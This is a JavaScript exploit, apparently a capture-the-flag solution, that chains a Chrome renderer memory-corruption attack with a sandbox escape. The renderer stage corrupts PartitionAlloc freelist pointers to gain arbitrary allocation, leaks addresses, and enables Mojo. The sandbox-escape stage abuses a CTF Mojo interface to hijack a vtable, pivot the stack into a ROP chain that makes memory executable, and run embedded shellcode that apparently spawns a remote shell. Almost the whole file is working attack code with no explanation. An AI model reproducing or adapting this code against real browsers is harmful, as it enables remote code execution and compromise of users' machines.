let ab = new ArrayBuffer(8);
let f64a = new Float64Array(ab);
let u64a = new BigUint64Array(ab);

function ftoi(v) {
    f64a[0] = v;
    return u64a[0];
}

function itof(v) {
    u64a[0] = v;
    return f64a[0];
}

function hex(v) {
    return "0x" + v.toString(16).padStart(16, 0);
}

function getSuperPageBase(addr) {
    let superPageOffsetMask = (BigInt(1) << BigInt(21)) - BigInt(1);
    let superPageBaseMask = ~superPageOffsetMask;
    let superPageBase = addr & superPageBaseMask;
    return superPageBase;
}

function getMetadataAreaBaseFromPartitionSuperPage(addr) {
    let superPageBase = getSuperPageBase(addr);
    let systemPageSize = BigInt(0x1000);
    return superPageBase + systemPageSize;
}

function getPartitionPageMetadataArea(addr) {
    let superPageOffsetMask = (BigInt(1) << BigInt(21)) - BigInt(1);
    let partitionPageIndex = (addr & superPageOffsetMask) >> BigInt(14);
    let pageMetadataSize = BigInt(0x20);
    let partitionPageMetadataPtr = getMetadataAreaBaseFromPartitionSuperPage(addr) + partitionPageIndex * pageMetadataSize;
    return partitionPageMetadataPtr;
}

function byteSwapBigInt(x) {
    let result = BigInt(0);
    let tmp = x;

    for (let i = 0; i < 8; i++) {
            result = result << BigInt(8);
            result += tmp & BigInt(0xFF);
            tmp = tmp >> BigInt(8);
    }

    return result;
}

let N = 8;

// If real = 1, select offsets for provided chrome. This is for renderer only.
let real = 0;
let no_gc = [];
// AB and TA for later OOB r/w
write64_ab = new ArrayBuffer(8);
write64_ta = new BigUint64Array(write64_ab);

// AB and TA for 1-byte r/w
data_ab = new ArrayBuffer(1);
data_ta = new Uint8Array(data_ab);

function sbx() {
    console.log("Now sbx...");
    console.log(Mojo);

    // If real_sbx = 1, select offsets for provided chrome. This is for sbx only.
    let real_sbx = 0;
    let offset_leak_sbx = real_sbx ? 0x4e0n : 0xf90n;
    let offset_leak_code = real_sbx ? 0x1760390n : 0x1787130n;
    let sbx_chrome = 0n;

    var ctf_ptr = new blink.mojom.CtfInterfacePtr();
    var ctf_name = blink.mojom.CtfInterface.name;
    var ctf_rq = mojo.makeRequest(ctf_ptr);
    Mojo.bindInterface(ctf_name, ctf_rq.handle);
    var not_gc = [];
    not_gc.push(ctf_ptr);

    (async () => {
        await ctf_ptr.resizeVector(0x20/8);
        await ctf_ptr.write(itof(0x1337133713371337n), 0);
        for (var i = 0; i < 20; i++) {
            var ptr = new blink.mojom.CtfInterfacePtr();
            var rq = mojo.makeRequest(ptr);
            Mojo.bindInterface(ctf_name, rq.handle);
            await ptr.resizeVector(0x20/8);
            await ptr.write(itof(0x1337133713371337n), 0);
            await ptr.write(itof(0x414142424343n), 3);
            not_gc.push(ptr);
        }

        let vtable_leak = 0n;
        let corrupt_ptr = undefined;
        let corrupt_idx = -1;
        let rw_ptr  = undefined;
        let restore = -1;

        for (var ptr of not_gc) {
            for (var i = 0; i < 50; i++) {
                let v = ftoi((await ptr.read(i)).value);
                if (vtable_leak == 0n && (v & 0xfffn) == offset_leak_sbx) {
                    vtable_leak = v;
                    // Leak address in vtable first;
                    restore = (await ptr.read(i + 1)).value;
                    await ptr.write(itof(vtable_leak), i + 1);
                    for (var ptr1 of not_gc) {
                        let v1 = ftoi((await ptr1.read(0)).value);
                        if (v1 != 0x1337133713371337n) {
                            rw_ptr = ptr1;
                            await ptr.write(restore, i + 1);
                            break;
                        }
                    }

                    corrupt_idx = i + 1;
                    corrupt_ptr = ptr;
                    break;
                }
            }

            if (vtable_leak) {
                break;
            }
        }

        console.log("[+] vtable_leak = " + hex(vtable_leak));
        console.log(corrupt_ptr == rw_ptr);

        async function arb_read(addr) {
            await corrupt_ptr.write(itof(addr), corrupt_idx);
            let res = (await rw_ptr.read(0)).value;
            await corrupt_ptr.write(restore, corrupt_idx);
            return res;
        }

        async function arb_write(addr, value) {
            await corrupt_ptr.write(itof(addr), corrupt_idx);
            await rw_ptr.write(itof(value), 0);
            await corrupt_ptr.write(restore, corrupt_idx);
        }

        async function arb_write_array(addr, data) {
            await corrupt_ptr.write(itof(addr), corrupt_idx);
            for (var i = 0; i < data.length; i++) {
                await rw_ptr.write(itof(data[i]), i);
            }
            await corrupt_ptr.write(restore, corrupt_idx);
        }

        sbx_chrome = vtable_leak - (real_sbx ? 0xbc774e0n : (0xecf90n + 0xbbca000n));
        if (real_sbx) {
            var xchg_rax = sbx_chrome + 0x000000000590510en;
            var add_rsp_pop_rbp = sbx_chrome + 0x000000000341bd4en;
            var pop_rax = sbx_chrome + 0x0000000003419404n;
            var pop_rdi = sbx_chrome + 0x00000000035d445dn;
            var pop_rsi = sbx_chrome + 0x000000000348edaen;
            var pop_rdx = sbx_chrome + 0x0000000003655332n;
            // let pivot_addr = sbx_chrome + 0xc390f40n - 0x40n;
            var pivot_addr = sbx_chrome + 0xc350000n;
            // let syscall = sbx_chrome + 0x000000000346d34dn;
            var syscall = sbx_chrome + 0x800dd77n;
            var page_start = sbx_chrome + 0xc2d0000n;
            var page_len = 0x82000n;
            var nop = sbx_chrome + 0x00000000033d0494n;
        } else {
            var xchg_rax = sbx_chrome + 0x00000000099d1d3en;
            var add_rsp_pop_rbp = sbx_chrome + 0x000000000342700en;
            var pop_rax = sbx_chrome + 0x000000000348e724n;
            var pop_rdi = sbx_chrome + 0x00000000035df71dn;
            var pop_rsi = sbx_chrome + 0x00000000036b075en;
            var pop_rdx = sbx_chrome + 0x00000000036605f2n;
            // let pivot_addr = sbx_chrome + 0xc390f40n - 0x40n;
            var pivot_addr = sbx_chrome + 0xc390000n;
            // let syscall = sbx_chrome + 0x000000000346d34dn;
            var syscall = sbx_chrome + 0x801ed67n;
            var page_start = sbx_chrome + 0xc310000n;
            var page_len = 0x81000n;
            var nop = sbx_chrome + 0x00000000033db754n;
        }

        console.log("[+] chrome_base = " + hex(sbx_chrome));
        console.log("[+] xchg_rax = " + hex(xchg_rax));
        console.log("[+] pivot_addr = " + hex(pivot_addr));
        let cnt = 0;


        for (var ptr of not_gc) {
            if (ptr == corrupt_ptr || ptr == rw_ptr) {
                continue;
            }

            for (var i = 0; i < 50; i++) {
                let v = ftoi((await ptr.read(i)).value);
                if (v == vtable_leak) {
                    cnt ++;
                    console.log("[+] Overwrite vtable...");
                    let fake_vtable = pivot_addr;
                    await ptr.write(itof(fake_vtable), i);

                    break;
                }
            }
            if (cnt > 0) {
                break;
            }
        }

        let rop = [
            add_rsp_pop_rbp,
            0xdeadbeefn,
            0xdeadbeefn,
            xchg_rax,
            0xdeadbeefn,
            0xdeadbeefn,
            pop_rax,
            10n,
            pop_rdi,
            page_start,
            pop_rsi,
            page_len,
            pop_rdx,
            0x7n,
            syscall,
            nop,
            pivot_addr + BigInt(8 * 21),
            nop,
            nop,
            nop,
            nop,
            // 0xcccccccc_ccccccccn,
            0x16a5f026a58296an,
            0x48c58948050f995en,
            0x1010101010101b8n,
            0x38040103b8485002n,
            0x240431480301017en,
            0x106aef8948582a6an,
            0x36a050fe689485an,
            0x6a560b78ceff485en,
            0xeb050fef89485821n,
            0x69622fb848686aefn,
            0x894850732f2f2f6en,
            0x34810101697268e7n,
            0x56f6310101010124n,
            0x4856e601485e086an,
            0xf583b6ad231e689n,
            0x9090909090909005n
        ];

        arb_write_array(pivot_addr, rop);
        setTimeout(async () => {
            for (var ptr of not_gc) {
                if (ptr == corrupt_ptr || ptr == rw_ptr) {
                    continue;
                }
                await ptr.read(0);
            }
        }, 1000);

    })();
}

if (typeof Mojo != "undefined") {
    sbx();
} else {
    rce();
}

function rce() {

    // OOB ArrayBuffer
    ab1 = new ArrayBuffer(4 * N);
    ta1 = new Uint32Array(ab1);
    no_gc.push(ab1);

    // Overwrite the last byte of the next freelist ptr, 1 alloc away.
    ta_leak = new Uint8Array(ab1);
    data_ta[0] = 0x10;
    ta_leak.set(data_ta, 4 * N + 7);

    data_ta[0] = 0xef
    ta_leak.set(data_ta, 4 * N + 15);

    // Alloc 1st time to get freelist head off
    tmp = new ArrayBuffer(4 * N);
    no_gc.push(tmp);
    // Alloc one more time to get to the overwritten pointer
    tmp = new ArrayBuffer(4 * N);
    tmpa = new Uint32Array(tmp);
    no_gc.push(tmp);
    // Marker, see if it is overlapped in ab1
    tmpa[0] = 0x41414141;
    let leak_idx = ta1.indexOf(tmpa[0])
    if (leak_idx == -1) {
        // throw "Did not get overlapping chunk";
        window.location.reload();
    }

    console.log("found overlapping chunk");

    for (var i = 0; i < 50; i++) {
        new ArrayBuffer(4 * N);
    }

    // Need to wait for leak to populate;
    setTimeout(() => {
        console.log("Continue pwn...");
        let pa_leak_hi = undefined;
        let pa_leak_lo = undefined;
        for (var i = 0; i < 0x10000; i++) {
            if (ta1[leak_idx] == 0x41414141 || ta1[leak_idx] == 0)  {
                continue;
                // throw "Did not get leak";
            }

            pa_leak_lo = ta1[leak_idx];
            pa_leak_hi = ta1[leak_idx + 1];
            console.log("[+] pa_leak_lo = " + hex(pa_leak_lo));
            console.log("[+] pa_leak_hi = " + hex(pa_leak_hi));
            break;
        }

        if (pa_leak_hi === undefined || pa_leak_lo === undefined) {
            window.location.reload();
        }

        console.log(pa_leak_hi);
        console.log(pa_leak_lo);

        let pa_leak = (BigInt(pa_leak_hi) << 32n) | BigInt(pa_leak_lo);
        console.log("[+] pa_leak big endian = " + hex(pa_leak));

        pa_leak = byteSwapBigInt(pa_leak);
        console.log("[+] pa_leak little endian = " + hex(pa_leak));

        let page_leak = pa_leak;
        metadata_base = getMetadataAreaBaseFromPartitionSuperPage(page_leak);
        metadata_area = getPartitionPageMetadataArea(page_leak);
        chrome_base = 0n;

        console.log("[+] metadata rel base = " + hex(metadata_base));
        console.log("[+] metadata area = " + hex(metadata_area));

        function arb_alloc(addr) {
            l_alloc_ab = new ArrayBuffer(8 * 6);
            no_gc.push(l_alloc_ab);
            l_alloc_arr = new BigUint64Array(l_alloc_ab);
            // Marker
            l_alloc_arr[0] = 0x1337133713371337n;

            let addr_big = byteSwapBigInt(BigInt(addr));
            write64_ta[0] = addr_big;
            l_alloc_arr.set(write64_ta, 6);

            let inverted_addr = addr_big ^ 0xffffffff_ffffffffn;
            write64_ta[0] = inverted_addr;
            l_alloc_arr.set(write64_ta, 7);

            tmp = new ArrayBuffer(8 * 6);
            no_gc.push(tmp);

            tmp = new ArrayBuffer(8 * 6);
            no_gc.push(tmp);

            return tmp;

        }

        metadata_area += 0x80n;

        tmp = arb_alloc(metadata_area);
        tmpa = new BigUint64Array(tmp);

        // Allocate corresponding size to populate with leak
        leak_me = new ArrayBuffer(8 * 8);
        chrome_leak = tmpa[2];
        console.log("[+] chrome_leak = " + hex(chrome_leak));
        if (real) {
            offset = BigInt(0x20ef0e - 0x1cb818);
        } else {
            offset = 0x43766n;
        }
        mojo_addr = chrome_leak + offset;
        console.log("[+] mojo_addr = " + hex(mojo_addr));

        // Allocate to mojo
        tmp = arb_alloc(mojo_addr);
        tmpa = new BigUint64Array(tmp);

        // Enable mojo
        tmpa[0] = 0x1n;

        var iframe = document.createElement('iframe');
        iframe.src = '/ggctf/exploit.html';
        document.body.appendChild(iframe);
    }, 10000);
}